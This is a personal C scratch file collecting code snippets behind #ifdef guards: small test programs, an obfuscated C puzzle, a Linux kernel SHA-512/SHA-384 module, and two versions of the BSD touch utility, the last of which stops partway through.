
# pragma ident "@(#)stdlab.c	13.42	2001/12/19	avrb"

/*	 _______________________________________________________________
 *	|																|
 *	|	stdlab.c						 (c) 2000 alexandre botao	|
 *	|_______________________________________________________________|
 */

#include <sys/time.h>
#include <sys/resource.h>
#include <sys/types.h>

# include <stdio.h>
# include <math.h>
# include <ctype.h>
# include <time.h>

/*	____	____	____	____	____	____	____	____	*/

# ifdef COMMENT

# include <stdio.h>
# include <math.h>
main () { /* round to ^2 thru floor(log2) */
	int i ;
	for ( i = 5 ; i <= 140 ; ++i )
		printf ("%3d %f\n", i, pow(2.0,floor(log2((double)i)))) ;
}

# endif /* COMMENT */

/*	____	____	____	____	____	____	____	____	*/

# ifdef COMMENT

/* shortest pgm 2 reverse argv[0] ? */

main(a,p)char**p;{for(p[1]+=strlen(p[1]);putchar(*--p[1]););}

# endif /* COMMENT */

/*	____	____	____	____	____	____	____	____	*/

# ifdef COMMENT

/* (part of) cpl.c */
# include <stdio.h>
char * n = "abcdefghij1234567890" ;
char * f [] = {
	"[%s]",
	"[%25s]",
	"[%-25s]",
	"[%15s]",
	"[%-15s]",
	"[%15.15s]",
	"[%-15.15s]",
	"[%.15s]",
	"[%-.15s]",
	NULL
} ;
main () {

	char * * pp = f ;

	for ( pp = f ; *pp != NULL ; ++pp ) {
		printf ("%s=", *pp) ;
		printf (*pp, n) ;
		printf ("\n") ;
	}
	printf ( "last(%d)=[%s]\n", 15, n + ( strlen (n) - 15 ) ) ;
}

# endif /* COMMENT */

/*	____	____	____	____	____	____	____	____	*/

# ifdef AMIT

# ifdef COMMENT

#include <stdio.h>
main(int t,char _,char *a) {
return!0<t?t<3?main(-79,-13,a+main(-87,1-_,
main(-86, 0, a+1 )+a)):1,t<_?main(t+1, _, a ):3,main ( -94, -27+t, a )&&t == 2 ?_<13 ?main ( 2, _+1, "%s %d %d\n" ):9:16:t<0?t<-72?main(_, t,"@n'+,#'/*{}w+/w#cdnr/+,{}r/*de}+,/*{*+,/w{%+,/w#q#n+,/#{l,+,/n{n+\
,/+#n+,/#;#q#n+,/+k#;*+,/'r :'d*'3,}{w+K w'K:'+}e#';dq#'l q#'+d'K#!/\
+k#;q#'r}eKK#}w'r}eKK{nl]'/#;#q#n'){)#}w'){){nl]'/+#n';d}rw' i;# ){n\
l]!/n{n#'; r{#w'r nc{nl]'/#{l,+'K {rw' iK{;[{nl]'/w#q#\ n'wk nw' iwk{KK{nl]!/w{%'l##w#' i; :{nl]'/*{q#'ld;r'}{nlwb!/*de}'c \
;;{nl'-{}rw]'/+,}##'*}#nc,',#nw]'/+kd'+e}+;\
#'rdq#w! nr'/ ') }+}{rl#'{n' ')# }'+}##(!!/") :t<-50?_==*a ?putchar(a[31]):main(-65,_,a+1):main((*a == '/')+t,_,a\
+1 ):0<t?main ( 2, 2 , "%s"):*a=='/'||main(0,main(-61,*a, "!ek;dc \
i@bK'(q)-[w]*%n+r3#l,{}:\nuwloca-O;m .vpbks,fxntdCeghiry"),a+1);}

# endif /* COMMENT */

# endif /* AMIT */

/*	____	____	____	____	____	____	____	____	*/

# ifdef NEA

# ifdef COMMENT

			chaotic encryption algorithm

new efficient bulk encryption / block-oriented symmetric cipher / very high encryption rate

encrypt blocks of plain-text by repeated intertwined application of substitution and permutation operations.
Permutations are induced by the highly unstable nonlinear dynamics of chaotic Kolmogorov flows,
while substitutions are implemented using add-with-carry or subtract-with-borrow generators.

# endif /* COMMENT */

# endif /* NEA */

/*	____	____	____	____	____	____	____	____	*/

# ifdef SHA512

/* SHA-512 code by Jean-Luc Cooke <jlcooke@certainkey.com>
 *
 * Copyright (c) Jean-Luc Cooke <jlcooke@certainkey.com>
 * Copyright (c) Andrew McDonald <andrew@mcdonald.org.uk>
 * Copyright (c) 2003 Kyle McMartin <kyle@debian.org>
 *
 */

#include <linux/kernel.h>
#include <linux/module.h>

#include <linux/mm.h>
#include <linux/init.h>
#include <linux/crypto.h>

#include <asm/scatterlist.h>
#include <asm/byteorder.h>

#define SHA384_DIGEST_SIZE 48
#define SHA512_DIGEST_SIZE 64
#define SHA384_HMAC_BLOCK_SIZE  96
#define SHA512_HMAC_BLOCK_SIZE 128

struct sha512_ctx {
	u64 state[8];
	u32 count[4];
	u8 buf[128];
};

static inline u64 Ch(u64 x, u64 y, u64 z)
{
        return ((x & y) ^ (~x & z));
}

static inline u64 Maj(u64 x, u64 y, u64 z)
{
        return ((x & y) ^ (x & z) ^ (y & z));
}

static inline u64 RORu64(u64 x, u64 y)
{
        return (x >> y) | (x << (64 - y));
}

const u64 sha512_K[80] = {
        0x428a2f98d728ae22, 0x7137449123ef65cd, 0xb5c0fbcfec4d3b2f,
        0xe9b5dba58189dbbc, 0x3956c25bf348b538, 0x59f111f1b605d019,
        0x923f82a4af194f9b, 0xab1c5ed5da6d8118, 0xd807aa98a3030242,
        0x12835b0145706fbe, 0x243185be4ee4b28c, 0x550c7dc3d5ffb4e2,
        0x72be5d74f27b896f, 0x80deb1fe3b1696b1, 0x9bdc06a725c71235,
        0xc19bf174cf692694, 0xe49b69c19ef14ad2, 0xefbe4786384f25e3,
        0x0fc19dc68b8cd5b5, 0x240ca1cc77ac9c65, 0x2de92c6f592b0275,
        0x4a7484aa6ea6e483, 0x5cb0a9dcbd41fbd4, 0x76f988da831153b5,
        0x983e5152ee66dfab, 0xa831c66d2db43210, 0xb00327c898fb213f,
        0xbf597fc7beef0ee4, 0xc6e00bf33da88fc2, 0xd5a79147930aa725,
        0x06ca6351e003826f, 0x142929670a0e6e70, 0x27b70a8546d22ffc,
        0x2e1b21385c26c926, 0x4d2c6dfc5ac42aed, 0x53380d139d95b3df,
        0x650a73548baf63de, 0x766a0abb3c77b2a8, 0x81c2c92e47edaee6,
        0x92722c851482353b, 0xa2bfe8a14cf10364, 0xa81a664bbc423001,
        0xc24b8b70d0f89791, 0xc76c51a30654be30, 0xd192e819d6ef5218,
        0xd69906245565a910, 0xf40e35855771202a, 0x106aa07032bbd1b8,
        0x19a4c116b8d2d0c8, 0x1e376c085141ab53, 0x2748774cdf8eeb99,
        0x34b0bcb5e19b48a8, 0x391c0cb3c5c95a63, 0x4ed8aa4ae3418acb,
        0x5b9cca4f7763e373, 0x682e6ff3d6b2b8a3, 0x748f82ee5defb2fc,
        0x78a5636f43172f60, 0x84c87814a1f0ab72, 0x8cc702081a6439ec,
        0x90befffa23631e28, 0xa4506cebde82bde9, 0xbef9a3f7b2c67915,
        0xc67178f2e372532b, 0xca273eceea26619c, 0xd186b8c721c0c207,
        0xeada7dd6cde0eb1e, 0xf57d4f7fee6ed178, 0x06f067aa72176fba,
        0x0a637dc5a2c898a6, 0x113f9804bef90dae, 0x1b710b35131c471b,
        0x28db77f523047d84, 0x32caab7b40c72493, 0x3c9ebe0a15c9bebc,
        0x431d67c49c100d4c, 0x4cc5d4becb3e42b6, 0x597f299cfc657e2a,
        0x5fcb6fab3ad6faec, 0x6c44198c4a475817,
};

#define e0(x)       (RORu64(x,28) ^ RORu64(x,34) ^ RORu64(x,39))
#define e1(x)       (RORu64(x,14) ^ RORu64(x,18) ^ RORu64(x,41))
#define s0(x)       (RORu64(x, 1) ^ RORu64(x, 8) ^ (x >> 7))
#define s1(x)       (RORu64(x,19) ^ RORu64(x,61) ^ (x >> 6))

/* H* initial state for SHA-512 */
#define H0         0x6a09e667f3bcc908
#define H1         0xbb67ae8584caa73b
#define H2         0x3c6ef372fe94f82b
#define H3         0xa54ff53a5f1d36f1
#define H4         0x510e527fade682d1
#define H5         0x9b05688c2b3e6c1f
#define H6         0x1f83d9abfb41bd6b
#define H7         0x5be0cd19137e2179

/* H'* initial state for SHA-384 */
#define HP0 0xcbbb9d5dc1059ed8
#define HP1 0x629a292a367cd507
#define HP2 0x9159015a3070dd17
#define HP3 0x152fecd8f70e5939
#define HP4 0x67332667ffc00b31
#define HP5 0x8eb44a8768581511
#define HP6 0xdb0c2e0d64f98fa7
#define HP7 0x47b5481dbefa4fa4

static inline void LOAD_OP(int I, u64 *W, const u8 *input)
{
        u64 t1  = input[(8*I)  ] & 0xff;
        t1 <<= 8;
        t1 |= input[(8*I)+1] & 0xff;
        t1 <<= 8;
        t1 |= input[(8*I)+2] & 0xff;
        t1 <<= 8;
        t1 |= input[(8*I)+3] & 0xff;
        t1 <<= 8;
        t1 |= input[(8*I)+4] & 0xff;
        t1 <<= 8;
        t1 |= input[(8*I)+5] & 0xff;
        t1 <<= 8;
        t1 |= input[(8*I)+6] & 0xff;
        t1 <<= 8;
        t1 |= input[(8*I)+7] & 0xff;
        W[I] = t1;
}

static inline void BLEND_OP(int I, u64 *W)
{
        W[I] = s1(W[I-2]) + W[I-7] + s0(W[I-15]) + W[I-16];
}

static void
sha512_transform(u64 *state, const u8 *input)
{
	u64 a, b, c, d, e, f, g, h, t1, t2;
	u64 W[80];

	int i;

	/* load the input */
        for (i = 0; i < 16; i++)
                LOAD_OP(i, W, input);

        for (i = 16; i < 80; i++) {
                BLEND_OP(i, W);
        }

	/* load the state into our registers */
	a=state[0];   b=state[1];   c=state[2];   d=state[3];  
	e=state[4];   f=state[5];   g=state[6];   h=state[7];  
  
	/* now iterate */
	for (i=0; i<80; i+=8) {
		t1 = h + e1(e) + Ch(e,f,g) + sha512_K[i  ] + W[i  ];
		t2 = e0(a) + Maj(a,b,c);    d+=t1;    h=t1+t2;
		t1 = g + e1(d) + Ch(d,e,f) + sha512_K[i+1] + W[i+1];
		t2 = e0(h) + Maj(h,a,b);    c+=t1;    g=t1+t2;
		t1 = f + e1(c) + Ch(c,d,e) + sha512_K[i+2] + W[i+2];
		t2 = e0(g) + Maj(g,h,a);    b+=t1;    f=t1+t2;
		t1 = e + e1(b) + Ch(b,c,d) + sha512_K[i+3] + W[i+3];
		t2 = e0(f) + Maj(f,g,h);    a+=t1;    e=t1+t2;
		t1 = d + e1(a) + Ch(a,b,c) + sha512_K[i+4] + W[i+4];
		t2 = e0(e) + Maj(e,f,g);    h+=t1;    d=t1+t2;
		t1 = c + e1(h) + Ch(h,a,b) + sha512_K[i+5] + W[i+5];
		t2 = e0(d) + Maj(d,e,f);    g+=t1;    c=t1+t2;
		t1 = b + e1(g) + Ch(g,h,a) + sha512_K[i+6] + W[i+6];
		t2 = e0(c) + Maj(c,d,e);    f+=t1;    b=t1+t2;
		t1 = a + e1(f) + Ch(f,g,h) + sha512_K[i+7] + W[i+7];
		t2 = e0(b) + Maj(b,c,d);    e+=t1;    a=t1+t2;
	}
  
	state[0] += a; state[1] += b; state[2] += c; state[3] += d;  
	state[4] += e; state[5] += f; state[6] += g; state[7] += h;  

	/* erase our data */
	a = b = c = d = e = f = g = h = t1 = t2 = 0;
	memset(W, 0, 80 * sizeof(u64));
}

static void
sha512_init(void *ctx)
{
        struct sha512_ctx *sctx = ctx;
	sctx->state[0] = H0;
	sctx->state[1] = H1;
	sctx->state[2] = H2;
	sctx->state[3] = H3;
	sctx->state[4] = H4;
	sctx->state[5] = H5;
	sctx->state[6] = H6;
	sctx->state[7] = H7;
	sctx->count[0] = sctx->count[1] = sctx->count[2] = sctx->count[3] = 0;
	memset(sctx->buf, 0, sizeof(sctx->buf));
}

static void
sha384_init(void *ctx)
{
        struct sha512_ctx *sctx = ctx;
        sctx->state[0] = HP0;
        sctx->state[1] = HP1;
        sctx->state[2] = HP2;
        sctx->state[3] = HP3;
        sctx->state[4] = HP4;
        sctx->state[5] = HP5;
        sctx->state[6] = HP6;
        sctx->state[7] = HP7;
        sctx->count[0] = sctx->count[1] = sctx->count[2] = sctx->count[3] = 0;
        memset(sctx->buf, 0, sizeof(sctx->buf));
}

static void
sha512_update(void *ctx, const u8 *data, unsigned int len)
{
        struct sha512_ctx *sctx = ctx;

	unsigned int i, index, part_len;

	/* Compute number of bytes mod 128 */
	index = (unsigned int)((sctx->count[0] >> 3) & 0x7F);
	
	/* Update number of bits */
	if ((sctx->count[0] += (len << 3)) < (len << 3)) {
		if ((sctx->count[1] += 1) < 1)
			if ((sctx->count[2] += 1) < 1)
				sctx->count[3]++;
		sctx->count[1] += (len >> 29);
	}
	
        part_len = 128 - index;
	
	/* Transform as many times as possible. */
	if (len >= part_len) {
		memcpy(&sctx->buf[index], data, part_len);
		sha512_transform(sctx->state, sctx->buf);

		for (i = part_len; i + 127 < len; i+=128)
			sha512_transform(sctx->state, &data[i]);

		index = 0;
	} else {
		i = 0;
	}

	/* Buffer remaining input */
	memcpy(&sctx->buf[index], &data[i], len - i);
}

static void
sha512_final(void *ctx, u8 *hash)
{
        struct sha512_ctx *sctx = ctx;
	
        const static u8 padding[128] = { 0x80, };

        u32 t;
	u64 t2;
        u8 bits[128];
	unsigned int index, pad_len;
	int i, j;

        index = pad_len = t = i = j = 0;
        t2 = 0;

	/* Save number of bits */
	t = sctx->count[0];
	bits[15] = t; t>>=8;
	bits[14] = t; t>>=8;
	bits[13] = t; t>>=8;
	bits[12] = t; 
	t = sctx->count[1];
	bits[11] = t; t>>=8;
	bits[10] = t; t>>=8;
	bits[9 ] = t; t>>=8;
	bits[8 ] = t; 
	t = sctx->count[2];
	bits[7 ] = t; t>>=8;
	bits[6 ] = t; t>>=8;
	bits[5 ] = t; t>>=8;
	bits[4 ] = t; 
	t = sctx->count[3];
	bits[3 ] = t; t>>=8;
	bits[2 ] = t; t>>=8;
	bits[1 ] = t; t>>=8;
	bits[0 ] = t; 

	/* Pad out to 112 mod 128. */
	index = (sctx->count[0] >> 3) & 0x7f;
	pad_len = (index < 112) ? (112 - index) : ((128+112) - index);
	sha512_update(sctx, padding, pad_len);

	/* Append length (before padding) */
	sha512_update(sctx, bits, 16);

	/* Store state in digest */
	for (i = j = 0; i < 8; i++, j += 8) {
		t2 = sctx->state[i];
		hash[j+7] = (char)t2 & 0xff; t2>>=8;
		hash[j+6] = (char)t2 & 0xff; t2>>=8;
		hash[j+5] = (char)t2 & 0xff; t2>>=8;
		hash[j+4] = (char)t2 & 0xff; t2>>=8;
		hash[j+3] = (char)t2 & 0xff; t2>>=8;
		hash[j+2] = (char)t2 & 0xff; t2>>=8;
		hash[j+1] = (char)t2 & 0xff; t2>>=8;
		hash[j  ] = (char)t2 & 0xff;
	}
	
	/* Zeroize sensitive information. */
	memset(sctx, 0, sizeof(struct sha512_ctx));
}

static void sha384_final(void *ctx, u8 *hash)
{
        struct sha512_ctx *sctx = ctx;
        u8 D[64];

        sha512_final(sctx, D);

        memcpy(hash, D, 48);
        memset(D, 0, 64);
}

static struct crypto_alg sha512 = {
        .cra_name       = "sha512",
        .cra_flags      = CRYPTO_ALG_TYPE_DIGEST,
        .cra_blocksize  = SHA512_HMAC_BLOCK_SIZE,
        .cra_ctxsize    = sizeof(struct sha512_ctx),
        .cra_module     = THIS_MODULE,
        .cra_list       = LIST_HEAD_INIT(sha512.cra_list),
        .cra_u          = { .digest = {
                                .dia_digestsize = SHA512_DIGEST_SIZE,
                                .dia_init       = sha512_init,
                                .dia_update     = sha512_update,
                                .dia_final      = sha512_final }
        }
};

static struct crypto_alg sha384 = {
        .cra_name       = "sha384",
        .cra_flags      = CRYPTO_ALG_TYPE_DIGEST,
        .cra_blocksize  = SHA384_HMAC_BLOCK_SIZE,
        .cra_ctxsize    = sizeof(struct sha512_ctx),
        .cra_module     = THIS_MODULE,
        .cra_list       = LIST_HEAD_INIT(sha384.cra_list),
        .cra_u          = { .digest = {
                                .dia_digestsize = SHA384_DIGEST_SIZE,
                                .dia_init       = sha384_init,
                                .dia_update     = sha512_update,
                                .dia_final      = sha384_final }
        }
};

static int __init init(void)
{
        int ret = 0;

        if ((ret = crypto_register_alg(&sha384)) < 0)
                goto out;
        if ((ret = crypto_register_alg(&sha512)) < 0)
                crypto_unregister_alg(&sha384);
out:
        return ret;
}

static void __exit fini(void)
{
        crypto_unregister_alg(&sha384);
        crypto_unregister_alg(&sha512);
}

module_init(init);
module_exit(fini);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("SHA-512 and SHA-384 Secure Hash Algorithms");

# endif

/*	____	____	____	____	____	____	____	____	*/

# ifdef TOUCH1


/*
 * Copyright (c) 1993
 *	The Regents of the University of California.  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by the University of
 *	California, Berkeley and its contributors.
 * 4. Neither the name of the University nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#ifndef lint
static char copyright[] =
"@(#) Copyright (c) 1993\n\
	The Regents of the University of California.  All rights reserved.\n";
#endif /* not lint */

#ifndef lint
static char sccsid[] = "@(#)touch.c	8.1 (Berkeley) 6/6/93";
#endif /* not lint */

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>

#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#if 1
#define	TIMEVAL_TO_TIMET(ts,t)		(*t) = (ts)->tv_sec
#endif

int	rw __P((char *, struct stat *, int));
void	stime_arg1 __P((char *, struct timeval *));
void	stime_arg2 __P((char *, int, struct timeval *));
void	stime_file __P((char *, struct timeval *));
void	usage __P((void));

char *__progname;

int
main(argc, argv)
	int argc;
	char *argv[];
{
	struct stat sb;
	struct timeval tv[2];
	int aflag, cflag, fflag, mflag, ch, fd, len, rval, timeset;
	char *p;

	__progname = basename(argv[0]);

	aflag = cflag = fflag = mflag = timeset = 0;
	if (gettimeofday(&tv[0], NULL))
		err(1, "gettimeofday");

	while ((ch = getopt(argc, argv, "acfmr:t:")) != -1)
		switch(ch) {
		case 'a':
			aflag = 1;
			break;
		case 'c':
			cflag = 1;
			break;
		case 'f':
			fflag = 1;
			break;
		case 'm':
			mflag = 1;
			break;
		case 'r':
			timeset = 1;
			stime_file(optarg, tv);
			break;
		case 't':
			timeset = 1;
			stime_arg1(optarg, tv);
			break;
		case '?':
		default:
			usage();
		}
	argc -= optind;
	argv += optind;

	/* Default is both -a and -m. */
	if (aflag == 0 && mflag == 0)
		aflag = mflag = 1;

	/*
	 * If no -r or -t flag, at least two operands, the first of which
	 * is an 8 or 10 digit number, use the obsolete time specification.
	 */
	if (!timeset && argc > 1) {
		(void)strtol(argv[0], &p, 10);
		len = p - argv[0];
		if (*p == '\0' && (len == 8 || len == 10)) {
			timeset = 1;
			stime_arg2(*argv++, len == 10, tv);
		}
	}

	/* Otherwise use the current time of day. */
	if (!timeset)
		tv[1] = tv[0];

	if (*argv == NULL)
		usage();

	for (rval = 0; *argv; ++argv) {
		/* See if the file exists. */
		if (stat(*argv, &sb))
			if (!cflag) {
				/* Create the file. */
				fd = open(*argv,
				    O_WRONLY | O_CREAT, DEFFILEMODE);
				if (fd == -1 || fstat(fd, &sb) || close(fd)) {
					rval = 1;
					warn("%s", *argv);
					continue;
				}

				/* If using the current time, we're done. */
				if (!timeset)
					continue;
			} else
				continue;

#if 0
		if (!aflag)
			TIMESPEC_TO_TIMEVAL(&tv[0], &sb.st_atimespec);
		if (!mflag)
			TIMESPEC_TO_TIMEVAL(&tv[1], &sb.st_mtimespec);
#else
		if (!aflag)
			TIMEVAL_TO_TIMET(&tv[0], &sb.st_atime);
		if (!mflag)
			TIMEVAL_TO_TIMET(&tv[1], &sb.st_mtime);
#endif

		/* Try utimes(2). */
		if (!utimes(*argv, tv))
			continue;

		/* If the user specified a time, nothing else we can do. */
		if (timeset) {
			rval = 1;
			warn("%s", *argv);
		}

		/*
		 * System V and POSIX 1003.1 require that a NULL argument
		 * set the access/modification times to the current time.
		 * The permission checks are different, too, in that the
		 * ability to write the file is sufficient.  Take a shot.
		 */
		 if (!utimes(*argv, NULL))
			continue;

		/* Try reading/writing. */
		if (rw(*argv, &sb, fflag))
			rval = 1;
	}
	exit(rval);
}

#define	ATOI2(ar)	((ar)[0] - '0') * 10 + ((ar)[1] - '0'); (ar) += 2;

void
stime_arg1(arg, tvp)
	char *arg;
	struct timeval *tvp;
{
	time_t now;
	struct tm *t;
	int century;
	int yearset;
	char *p;
					/* Start with the current time. */
#if 0
	now = tvp[0].tv_sec;
#else
	TIMEVAL_TO_TIMET(tvp, &now);
#endif
	if ((t = localtime(&now)) == NULL)
		err(1, "localtime");
	
	century = 1900 + (100 * (t->tm_year / 100));

					/* [[CC]YY]MMDDhhmm[.SS] */
	if ((p = strchr(arg, '.')) == NULL)
		t->tm_sec = 0;		/* Seconds defaults to 0. */
	else {
		if (strlen(p + 1) != 2)
			goto terr;
		*p++ = '\0';
		t->tm_sec = ATOI2(p);
	}

	yearset = 0;
	switch(strlen(arg)) {
	case 12:			/* CCYYMMDDhhmm */
		t->tm_year = ATOI2(arg);
		t->tm_year *= 100;
		yearset = 1;
		/* FALLTHOUGH */
	case 10:			/* YYMMDDhhmm */
		if (yearset) {
			yearset = ATOI2(arg);
			t->tm_year += yearset;
		} else {
			yearset = ATOI2(arg);
#if 0
			if (yearset < 69)
				t->tm_year = yearset + 2000;
			else
				t->tm_year = yearset + 1900;
#else
			/* y < 69 is klunky, and will hopefully fail before
			 * I do.  instead we'll modulo the low two digits of
			 * the current time and add the current century to
			 * the year.
			 */
			t->tm_year = yearset + century;
#endif
		}
		t->tm_year -= 1900;	/* Convert to UNIX time. */
		/* FALLTHROUGH */
	case 8:				/* MMDDhhmm */
		t->tm_mon = ATOI2(arg);
		--t->tm_mon;		/* Convert from 01-12 to 00-11 */
		t->tm_mday = ATOI2(arg);
		t->tm_hour = ATOI2(arg);
		t->tm_min = ATOI2(arg);
		break;
	default:
		goto terr;
	}

	t->tm_isdst = -1;		/* Figure out DST. */
	tvp[0].tv_sec = tvp[1].tv_sec = mktime(t);
	if (tvp[0].tv_sec == -1)
terr:		errx(1,
	"out of range or illegal time specification: [[CC]YY]MMDDhhmm[.SS]");

	tvp[0].tv_usec = tvp[1].tv_usec = 0;
}

void
stime_arg2(arg, year, tvp)
	char *arg;
	int year;
	struct timeval *tvp;
{
	time_t now;
	struct tm *t;
					/* Start with the current time. */
	now = tvp[0].tv_sec;
	if ((t = localtime(&now)) == NULL)
		err(1, "localtime");

	t->tm_mon = ATOI2(arg);		/* MMDDhhmm[yy] */
	--t->tm_mon;			/* Convert from 01-12 to 00-11 */
	t->tm_mday = ATOI2(arg);
	t->tm_hour = ATOI2(arg);
	t->tm_min = ATOI2(arg);
	if (year)
		t->tm_year = ATOI2(arg);

	t->tm_isdst = -1;		/* Figure out DST. */
	tvp[0].tv_sec = tvp[1].tv_sec = mktime(t);
	if (tvp[0].tv_sec == -1)
		errx(1,
	"out of range or illegal time specification: MMDDhhmm[yy]");

	tvp[0].tv_usec = tvp[1].tv_usec = 0;
}

void
stime_file(fname, tvp)
	char *fname;
	struct timeval *tvp;
{
	struct stat sb;

	if (stat(fname, &sb))
		err(1, "%s", fname);
#if 0
	TIMESPEC_TO_TIMEVAL(tvp, &sb.st_atimespec);
	TIMESPEC_TO_TIMEVAL(tvp + 1, &sb.st_mtimespec);
#else
	TIMEVAL_TO_TIMET(tvp, &sb.st_atime);
	TIMEVAL_TO_TIMET(tvp + 1, &sb.st_mtime);
#endif
}

int
rw(fname, sbp, force)
	char *fname;
	struct stat *sbp;
	int force;
{
	int fd, needed_chmod, rval;
	u_char byte;

	/* Try regular files and directories. */
	if (!S_ISREG(sbp->st_mode) && !S_ISDIR(sbp->st_mode)) {
#if 0
		warnx("%s: %s", fname, strerror(EFTYPE));
#else
		warnx("%s: Not a file or directory", fname);
#endif
		return (1);
	}

	needed_chmod = rval = 0;
	if ((fd = open(fname, O_RDWR, 0)) == -1) {
		if (!force || chmod(fname, DEFFILEMODE))
			goto err;
		if ((fd = open(fname, O_RDWR, 0)) == -1)
			goto err;
		needed_chmod = 1;
	}

	if (sbp->st_size != 0) {
		if (read(fd, &byte, sizeof(byte)) != sizeof(byte))
			goto err;
		if (lseek(fd, (off_t)0, SEEK_SET) == -1)
			goto err;
		if (write(fd, &byte, sizeof(byte)) != sizeof(byte))
			goto err;
	} else {
		if (write(fd, &byte, sizeof(byte)) != sizeof(byte)) {
err:			rval = 1;
			warn("%s", fname);
		} else if (ftruncate(fd, (off_t)0)) {
			rval = 1;
			warn("%s: file modified", fname);
		}
	}

	if (close(fd) && rval != 1) {
		rval = 1;
		warn("%s", fname);
	}
	if (needed_chmod && chmod(fname, sbp->st_mode) && rval != 1) {
		rval = 1;
		warn("%s: permissions modified", fname);
	}
	return (rval);
}

void
usage()
{
	(void)fprintf(stderr,
	    "usage: touch [-acfm] [-r file] [-t time] file ...\n");
	exit(1);
}

# endif

/*	____	____	____	____	____	____	____	____	*/

# ifdef TOUCH2

/*	$OpenBSD: touch.c,v 1.10 2003/06/10 22:20:53 deraadt Exp $	*/
/*	$NetBSD: touch.c,v 1.11 1995/08/31 22:10:06 jtc Exp $	*/

/*
 * Copyright (c) 1993
 *	The Regents of the University of California.  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. Neither the name of the University nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#ifndef lint
static char copyright[] =
"@(#) Copyright (c) 1993\n\
	The Regents of the University of California.  All rights reserved.\n";
#endif /* not lint */

#ifndef lint
#if 0
static char sccsid[] = "@(#)touch.c	8.2 (Berkeley) 4/28/95";
#endif
static char rcsid[] = "$OpenBSD: touch.c,v 1.10 2003/06/10 22:20:53 deraadt Exp $";
#endif /* not lint */

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>

#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <locale.h>
#include <time.h>
#include <tzfile.h>
#include <unistd.h>

int	rw(char *, struct stat *, int);
void	stime_arg1(char *, struct timeval *);
void	stime_arg2(char *, int, struct timeval *);
void	stime_file(char *, struct timeval *);
void	usage(void);

int
main(int argc, char *argv[])
{
	struct stat sb;
	struct timeval tv[2];
	int aflag, cflag, fflag, mflag, ch, fd, len, rval, timeset;
	char *p;

	setlocale(LC_ALL, "");

	aflag = cflag = fflag = mflag = timeset = 0;
	if (gettimeofday(&tv[0], NULL))
		err(1, "gettimeofday");

	while ((ch = getopt(argc, argv, "acfmr:t:")) != -1)
		switch(ch) {
		case 'a':
			aflag = 1;
			break;
		case 'c':
			cflag = 1;
			break;
		case 'f':
			fflag = 1;
			break;
		case 'm':
			mflag = 1;
			break;
		case 'r':
			timeset = 1;
			stime_file(optarg, tv);
			break;
		case 't':
			timeset = 1;
			stime_arg1(optarg, tv);
			break;
		case '?':
		default:
			usage();
		}
	argc -= optind;
	argv += optind;

	/* Default is both -a and -m. */
	if (aflag == 0 && mflag == 0)
		aflag = mflag = 1;

	/*
	 * If no -r or -t flag, at least two operands, the first of which
	 * is an 8 or 10 digit number, use the obsolete time specification.
	 */
	if (!timeset && argc > 1) {
		(void)strtol(argv[0], &p, 10);
		len = p - argv[0];
		if (*p == '\0' && (len == 8 || len == 10)) {
			timeset = 1;
			stime_arg2(*argv++, len == 10, tv);
		}
	}

	/* Otherwise use the current time of day. */
